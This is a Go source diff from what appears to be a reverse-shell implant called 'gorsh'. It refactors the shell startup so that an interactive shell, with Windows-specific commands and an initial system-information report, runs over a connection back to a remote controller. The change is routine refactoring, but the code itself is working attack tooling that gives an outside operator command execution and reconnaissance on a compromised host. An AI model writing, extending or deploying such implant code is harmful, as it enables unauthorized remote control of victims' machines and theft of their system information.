@@ -7,11 +7,11 @@ import (
 	"fmt"
 	"os"
 
-	"github.com/abiosoft/ishell"
-	"github.com/abiosoft/readline"
 	"git.hyrule.link/blink/gorsh/pkg/cmds"
 	"git.hyrule.link/blink/gorsh/pkg/myconn"
 	"git.hyrule.link/blink/gorsh/pkg/sitrep"
+	"github.com/abiosoft/ishell"
+	"github.com/abiosoft/readline"
 )
 
 const (
@@ -34,19 +34,20 @@ func InitReverseShell(connectString string, fingerprint []byte) {
 	}
 
 	myconn.Conn = conn
-	StartShell(conn)
+	StartShell()
 }
 
-func StartShell(conn myconn.Writer) {
+func StartShell() {
+
 	hostname, _ := os.Hostname()
 	conf := &readline.Config{
 		Prompt:      fmt.Sprintf("[%s]> ", hostname),
-		Stdin:       conn,
-		StdinWriter: conn,
-		Stdout:      conn,
-		Stderr:      conn,
+		Stdin:       myconn.Conn,
+		StdinWriter: myconn.Conn,
+		Stdout:      myconn.Conn,
+		Stderr:      myconn.Conn,
 		VimMode:     true,
-		// UniqueEditLine:      true,
+		// UniqueEditLine: true,
 	}
 
 	// use these option when connection is a reverse shell,
@@ -62,7 +63,9 @@ func StartShell(conn myconn.Writer) {
 
 	cmds.RegisterCommands(sh)
 	cmds.RegisterWindowsCommands(sh)
-	myconn.Send(conn, sitrep.SysInfo())
+	myconn.Send(myconn.Conn, sitrep.InitialInfo())
+
+	cmds.Shell(&ishell.Context{})
 	sh.Run()
 	os.Exit(0)
 }
